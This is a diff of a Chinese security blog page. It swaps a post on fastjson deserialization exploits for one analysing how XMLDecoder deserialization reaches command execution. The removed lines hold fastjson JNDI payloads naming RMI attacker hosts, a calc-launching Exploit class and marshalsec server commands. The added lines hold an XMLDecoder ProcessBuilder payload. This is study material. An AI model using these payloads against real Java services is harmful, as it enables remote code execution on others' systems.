@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="java反序列化——fastjson, Fortheone">
+    <meta name="keywords" content="XMLDecoder反序列化, Fortheone">
     <meta name="description" content>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>java反序列化——fastjson | Fortheone</title>
+    <title>XMLDecoder反序列化 | Fortheone</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">java反序列化——fastjson</h1>
+                    <h1 class="description center-align post-title">XMLDecoder反序列化</h1>
                 </div>
             </div>
         </div>
@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-28
+                    2020-08-12
                 </div>
                 
 
@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    5 分
                 </div>
                 
 
@@ -456,219 +456,144 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="fastjson反序列化">fastjson反序列化</h3>
-<p>环境搭建<br>
-直接到maven的仓库里找对应版本的依赖代码即可</p>
-<pre><code>&lt;dependency&gt;
-    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
-    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
-    &lt;version&gt;1.2.24&lt;/version&gt;
-&lt;/dependency&gt;
-</code></pre>
-<p>然后再引入依赖即可。</p>
-<p>在fastjson中我们常说的序列化就是将java对象转换成json字符串，而反序列化就是将json字符串转换成java对象。看个例子</p>
-<p>User类</p>
-<pre><code>package fastjsontest;
+                <h3 id="前言">前言</h3>
+<p>最近学习java反序列化学到了weblogic部分，weblogic之前的两个反序列化漏洞不涉及T3协议之类的，只是涉及到了XMLDecoder反序列化导致漏洞，但是网上大部分的文章都只讲到了触发XMLDecoder部分就结束了，并没有讲为什么XMLDecoder会触发反序列化导致命令执行。于是带着好奇的我就跟着调了一下XMLDecoder的反序列化过程。</p>
+<h3 id="xml序列化">xml序列化</h3>
+<p>首先了解一下java中的XMLDecoder是什么。XMLDecoder就是jdk中一个用于处理xml数据的类，先看两个例子。</p>
+<p>这里引用一下浅蓝表哥的（强推浅蓝表哥的博客https://b1ue.cn/</p>
+<pre><code>import java.beans.XMLEncoder;
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.HashMap;
 
-public class User {
-    private int age;
-    public String name;
-    public void sayHello(){
-        System.out.println(&quot;Hello, I am &quot;+name);
-    }
-    public void getName(){
-        System.out.println(name);
-    }
+/**
+ * @author 浅蓝
+ * @email blue@ixsec.org
+ * @since 2019/4/24 12:09
+ */
+public class Test {
 
-    public int getAge() {
-        return age;
-    }
+    public static void main(String[] args) throws IOException, InterruptedException {
 
-    public void setAge(int age) {
-        this.age = age;
-        //System.out.println(&quot;调用了setAge方法&quot;);
-    }
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        map.put(&quot;123&quot;,&quot;aaaa&quot;);
+        map.put(&quot;321&quot;,new ArrayList&lt;&gt;());
 
-    public void setName(String name) {
-        //System.out.println(&quot;调用了setName方法&quot;);
-        this.name = name;
+        XMLEncoder xmlEncoder = new XMLEncoder(System.out);
+        xmlEncoder.writeObject(map);
+        xmlEncoder.close();
+
     }
 }
 </code></pre>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/1.png" alt></p>
-<p>这样就可以把java对象转换位json字符串，也就是fastjson中的序列化。</p>
-<p>而fastjson在反序列化时有一个特性，就是会把反序列化对象的所有set方法执行一遍。我们在User类的set方法中都加上一个输出，然后进行反序列化，看看结果如何。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/2.png" alt></p>
-<p>可以看到这里执行了set方法中我们设置的输出。那么就可以想到和普通的反序列化一样，如果set方法中存在恶意操作，即可造成漏洞利用。</p>
-<p>但是fastjson中parseObject如果没有指定要转换成的类，就只会返回JSONObject，并且不会自动调用set方法。</p>
-<p>在fastjson中设置了可以使用 @type属性来指定要反序列的类。</p>
-<h4 id="fastjson-反序列化利用链-1-2-24">fastjson 反序列化利用链 1.2.24</h4>
-<p>我们知道在fastjson中可以通过@type属性来指定要反序列化的类，而且fastjson在反序列化时会自动执行所有setXXXX的方法，所以如果某个类的setXXXX方法中有可以利用的操作，即可造成漏洞。</p>
-<p>而在java的反序列化漏洞中最常用到的就是 lookup这个方法，它会去访问指定的rmi/ldap服务器，我们只要在自己的服务器上搭建rmi/ldap服务，并且绑定一个恶意类，通过lookup就可以造成攻击。</p>
-<p>而fastjson中刚好就有这么一个类 JdbcRowSetImpl<br>
-看一下它的setXXXX方法：</p>
-<pre><code>    public void setDataSourceName(String name) throws SQLException {
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/QQ%E6%88%AA%E5%9B%BE20200812162448.png" alt></p>
+<p>这样就把map对象变成了xml数据，再使用XMLDecoder解析一下。</p>
+<pre><code>/**
+ * @author 浅蓝
+ * @email blue@ixsec.org
+ * @since 2019/4/24 12:09
+ */
+public class Test {
 
-        if (name == null) {
-            dataSource = null;
-        } else if (name.equals(&quot;&quot;)) {
-           throw new SQLException(&quot;DataSource name cannot be empty string&quot;);
-        } else {
-           dataSource = name;
-        }
+    public static void main(String[] args) throws IOException, InterruptedException {
+        String s = &quot;&lt;java version=\&quot;1.8.0_131\&quot; class=\&quot;java.beans.XMLDecoder\&quot;&gt;\n&quot; +
+                &quot; &lt;object class=\&quot;java.util.HashMap\&quot;&gt;\n&quot; +
+                &quot;  &lt;void method=\&quot;put\&quot;&gt;\n&quot; +
+                &quot;   &lt;string&gt;123&lt;/string&gt;\n&quot; +
+                &quot;   &lt;string&gt;aaaa&lt;/string&gt;\n&quot; +
+                &quot;  &lt;/void&gt;\n&quot; +
+                &quot;  &lt;void method=\&quot;put\&quot;&gt;\n&quot; +
+                &quot;   &lt;string&gt;321&lt;/string&gt;\n&quot; +
+                &quot;   &lt;object class=\&quot;java.util.ArrayList\&quot;/&gt;\n&quot; +
+                &quot;  &lt;/void&gt;\n&quot; +
+                &quot; &lt;/object&gt;\n&quot; +
+                &quot;&lt;/java&gt;&quot;;
+        StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s);
+        XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);
+        Object o = xmlDecoder.readObject();
+        System.out.println(o);
 
-        URL = null;
-    }
-</code></pre>
-<pre><code>    public void setAutoCommit(boolean var1) throws SQLException {
-        if (this.conn != null) {
-            this.conn.setAutoCommit(var1);
-        } else {
-            this.conn = this.connect();
-            this.conn.setAutoCommit(var1);
-        }
-
-    }
-</code></pre>
-<p>在 setAutoCommit 方法中判断了如果 connect 为空就去调用 connect 方法。再看看connect方法</p>
-<pre><code>    protected Connection connect() throws SQLException {
-        if (this.conn != null) {
-            return this.conn;
-        } else if (this.getDataSourceName() != null) {
-            try {
-                InitialContext var1 = new InitialContext();
-                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
-                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
-            } catch (NamingException var3) {
-                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
-            }
-        } else {
-            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
-        }
-    }
-</code></pre>
-<p>可以看到在connect方法中有一个lookup方法，且其中的参数就是由我们在setDataSourceName设置的值。<br>
-所以得到payload</p>
-<p><code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1999/Exploit&quot;,&quot;autoCommit&quot;:true}</code></p>
-<p>我们去服务器上部署rmi/ldap服务器绑定恶意类。</p>
-<p>首先创建一个恶意类 Exploit.java</p>
-<pre><code>import java.io.BufferedReader;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-
-public class Exploit{
-    public Exploit() throws Exception {
-        Process p = Runtime.getRuntime().exec(new String[]{&quot;cmd&quot;,&quot;/c&quot;,&quot;calc.exe&quot;});//执行命令打开计算器程序
-        InputStream is = p.getInputStream();
-        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
-
-        String line;
-        while((line = reader.readLine()) != null) {
-            System.out.println(line);
-        }
-
-        p.waitFor();
-        is.close();
-        reader.close();
-        p.destroy();
-    }
-
-    public static void main(String[] args) throws Exception {
     }
 }
 </code></pre>
-<p>然后javac Exploit.java 编译成class文件 开启一个简易的http服务。<br>
-python -m SimpleHTTPserver 8888</p>
-<p>然后使用marshalsec起一个rmi服务 并且绑定Exploit这个恶意类。<br>
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndRMIRefServer “<a href="http://xxx.xxx.xxx.xxx:8888/#Exploit" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx:8888/#Exploit</a>” 9998</p>
-<p>现在9998这个端口就绑定了Exploit恶意类，通过lookup访问该rmi服务器即可形成攻击。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/3.png" alt></p>
-<h4 id="fastjson反序列化利用链-1-2-47">fastjson反序列化利用链 &lt;=1.2.47</h4>
-<p>在fastjson1.2.24之后，使用 checkAutoType 来检验传入的反序列化类型，使用了黑白名单的方式来校验。 所以导致一些不在黑名单的类可以绕过限制，不过这些都不是这篇讨论的关键。主要看在1.2.47中通过mappings缓存绕过checkAutoType的方法。</p>
-<p>首先来看payload</p>
-<pre><code>{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;f&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.165.93.31:1090/evil&quot;,&quot;autoCommit&quot;:&quot;true&quot;}}
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812163341.png" alt></p>
+<p>就可以把之前的xml数据反序列化回map对象，那么如果对xml数据进行修改，使其变成一个执行命令的数据。比如说：</p>
+<pre><code>&lt;java version=&quot;1.7.0_80&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+ &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;
+  &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt;
+    &lt;void index=&quot;0&quot;&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt;
+  &lt;/array&gt;
+  &lt;void method=&quot;start&quot;&gt;&lt;/void&gt;
+ &lt;/object&gt;
+&lt;/java&gt;
 </code></pre>
-<p>从payload来看，序列化了两个对象，一个是java.lang.Class 另一个就是我们要利用的jndi注入的对象 com.sun.rowset.JdbcRowSetImpl。我们接着跟进数据处理过程。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/4.png" alt></p>
-<p>在前面进行了一系列解析处理之后，取出@type的值 java.lang.Class 作为typeName传入checkAutoType中进行检查。跟进checkAutoType看看</p>
-<pre><code>
-public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {
-        if (typeName == null) {
-            return null;
-        }
-                //省略部分代码
-
-        if (clazz == null) {
-            clazz = TypeUtils.getClassFromMapping(typeName);//将typeName作为key从mappings(ConcurrentMap对象)中查找对象,这个相当于从cache取值，刚开始没有存入对象，取出值为null
-        }
-
-        if (clazz == null) {
-            clazz = deserializers.findClass(typeName);// 将typeName作为key从deserializers(IdentityHashMap)中查找对象
-        }
-
-        if (clazz != null) {
-            if (expectClass != null
-                    &amp;&amp; clazz != java.util.HashMap.class
-                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
-                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
-            }
-
-            return clazz;
-        }
-
-        if (!autoTypeSupport) {//判断提取的对象hash值是否在denyHashCodes，也就是黑名单过滤
-            long hash = h3;
-            for (int i = 3; i &lt; className.length(); ++i) {
-                char c = className.charAt(i);
-                hash ^= c;
-                hash *= PRIME;
-
-                if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) {
-                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
-                }
-
-                if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {
-                    if (clazz == null) {
-                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
-                    }
-
-                    if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
-                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
-                    }
-
-                    return clazz;
-                }
-            }
-        }
-
-        if (clazz == null) {
-            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
-        }
-
-        //省略部分代码
-        return clazz;
-    }
+<p>然后对其反序列化即可执行命令弹出计算器。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812164302.png" alt></p>
+<p>现在我们知道了如果使用XMLDecoder去反序列化xml数据，数据中包含的命令会被执行。接下来就对其进行分析一下。</p>
+<h3 id="XMLDecoder反序列化漏洞成因">XMLDecoder反序列化漏洞成因</h3>
+<h4 id="一、XML数据解析前的函数处理">一、XML数据解析前的函数处理</h4>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812164537.png" alt></p>
+<p>在readObject处打上断点开始debug</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812164606.png" alt></p>
+<p>进入了parsingComplete方法，跟进。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812164659.png" alt></p>
+<p>其中使用XMLDecoder的handler属性DocumentHandler的parse方法，并且传入了我们输入的xml数据，跟进。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812164903.png" alt></p>
+<p>这里调用了SAXParserImpl类的parse方法。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812165034.png" alt></p>
+<p>然后又进了xmlReader的parse方法。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812165118.png" alt></p>
+<p>这里又调用了xmlReader父类AbstractSAXParser的parser方法。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812165405.png" alt></p>
+<p>最后进入了XML11Configuration类的parse方法。</p>
+<h4 id="二、XML数据的处理">二、XML数据的处理</h4>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812165912.png" alt></p>
+<p>在XML11Configuration中进行了很多解析XML之前的操作，我们不去仔细研究，看到处理XML数据的函数scanDocument。跟进查看</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812170018.png" alt></p>
+<p>这个函数通过迭代的方式对XML数据的标签进行解析，网上有些文章写道“解析至END_ELEMENT时跟进调试”，但是我看了一下我这里的END_ELEMENT。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812170447.png" alt></p>
+<p>里面没有函数可以跟进啊，然后搜了一些其他的文章，是因为jdk版本的问题，处理的逻辑放在了next函数里。在do while循环里跳了大概十次，就开始解析了xml的标签。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812173204.png" alt></p>
+<p>跳到XMLDocumentScannerImpl中的next方法</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/1597225960902.png" alt></p>
+<p>跳到XMLDocumentFragmentScannerImpl中的next方法，解析到endtag时会走到scanEndElement方法里。</p>
+<p>然后就到了网上说的endElement方法里，跟进。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812175319.png" alt></p>
+<p>这一部分的解析可以参考下图：</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812175947.png" alt></p>
+<p>也就是说解析时会按照标签一个一个解析。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812175538.png" alt></p>
+<p>这里调用了DocumentHandler的endElement方法。<strong>接下来就是很重要的部分</strong></p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812180157.png" alt></p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812184547.png" alt></p>
+<p>这里的handler是StringElementHandler，但是这个类没有重写endElement方法，所以调用的是父类ElementHandler的endElement方法，其中调用了getValueObject来获取标签中的value值，这里的标签是string标签，所以获取到的值是calc。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812190724.png" alt></p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812190823.png" alt></p>
+<p>然后将其添加到其父类标签VoidElementHandler的Argument属性中。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812190950.png" alt></p>
+<p>然后将handler指向其父类VoidElementHandler。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812191418.png" alt></p>
+<p>继续解析到void标签，此时的handler就是VoidElementHandler，接着调用getValueObject。但是因为没有重写该方法，所以调用父类NewElementHandler的getValueObject。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812192219.png" alt></p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812192249.png" alt></p>
+<p>继续跟进发现实现了反射调用invoke方法，也就是执行了set方法。接着再解析Array标签，按照上面的步骤解析，就完成了这一部分参数的解析。</p>
+<pre><code>&lt;array class=&quot;java.lang.String&quot;length=&quot;1&quot;&gt;
+  &lt;void index=&quot;0&quot;&gt;
+      &lt;string&gt;calc&lt;/string&gt;
+  &lt;/void&gt;
+&lt;/array&gt;
 </code></pre>
-<p>前面经过一系列处理后进入了判断 clazz为null，然后使用 getClassFromMapping来获取对象，跟进看看<br>
-<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/5.png" alt></p>
-<p>刚开始缓存中没有存入值，所以返回null。<br>
-<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/6.png" alt><br>
-然后调用findClass方法，因为 java.lang.Class就在buckets中，所以直接返回 java.lang.Class。<br>
-然后因为clazz不为null了，也就跳过了黑名单的判断。然后继续回到parseObject<br>
-<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/7.png" alt><br>
-通过getDeserializer获取到MiscCodec，然后调用该类的deserialze方法，跟进该方法。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/8.png" alt><br>
-<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/9.png" alt></p>
-<p>其中使用parser.parse获取到了com.sun.rowset.JdbcRowSetImpl 并赋值给 strVal<br>
-<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/10.png" alt><br>
-再调用loadClass方法，其中将com.sun.rowset.JdbcRowSetImpl存入了缓存中<br>
-<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/11.png" alt></p>
-<p>至此第一部分解析完成了，然后开始解析第二部分。将com.sun.rowset.JdbcRowSetImpl赋值给typename传入checkAutoType中<br>
-<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/12.png" alt><br>
-在第一步中clazz直接可以通过 getClassFromMapping 获得，也就是缓存中的com.sun.rowset.JdbcRowSetImpl</p>
-<p>也就绕过了后面黑名单的判断。后面的反序列化过程也就和1.2.24中一样了。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/13.png" alt></p>
-<h4 id="fastjson-1-2-68-（还没有poc，暂时分析不来）">fastjson 1.2.68 （还没有poc，暂时分析不来）</h4>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812192828.png" alt></p>
+<p>那么再按照上面的步骤解析object标签，然后调用new 方法实例化 ProcessBuilder类。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812193210.png" alt></p>
+<p>然后解析到void标签获取到start方法，然后通过调用start方法实现了命令执行，弹出计算器。</p>
+<p>也就相当于最后拼接了 <code>new java.lang.ProcessBuilder(new String[]{&quot;calc&quot;}).start();</code></p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812193412.png" alt></p>
+<p>文章有说的不对的地方请师傅们指点，刚开始学java，大佬们轻喷。。。</p>
+<h3 id="参考文章">参考文章</h3>
+<p><a href="https://b1ue.cn/archives/239.html" target="_blank" rel="noopener">https://b1ue.cn/archives/239.html</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/108754274" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/108754274</a></p>
+<p><a href="https://blog.csdn.net/SKI_12/article/details/85058040" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/85058040</a></p>
 
             </div>
             <hr>
@@ -694,7 +619,7 @@ public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass,
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/year/07/28/java反序列化——fastjson/">http://yoursite.com/year/07/28/java反序列化——fastjson/</a>
+                    <a href="http://yoursite.com/year/08/12/XMLDecoder反序列化/">http://yoursite.com/year/08/12/XMLDecoder反序列化/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1160,7 +1085,8 @@ public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass,
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/year/08/12/XMLDecoder反序列化/">
                     <div class="card-image">
@@ -1179,9 +1105,9 @@ public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass,
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1194,6 +1120,7 @@ public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass,
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1204,26 +1131,29 @@ public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass,
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/07/24/java反序列化——Commons-Collections/">
+                <a href="/year/07/28/java反序列化——fastjson/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="java反序列化——Commons Collections">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="java反序列化——fastjson">
                         
-                        <span class="card-title">java反序列化——Commons Collections</span>
+                        <span class="card-title">java反序列化——fastjson</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            看了好久的文章才开始分析调试java的cc链，这个链算是java反序列化漏洞里的基础了。昨天分析调试的shiro也是直接使用了cc链。首先先了解一些java的反射机制。
-一、什么是反射：
-反射是Java的特征之一，是一种间接操作目标对象的机
+                            fastjson反序列化
+环境搭建
+直接到maven的仓库里找对应版本的依赖代码即可
+&lt;dependency&gt;
+    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+    &lt;art
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-28
                             </span>
                         <span class="publish-author">
                             
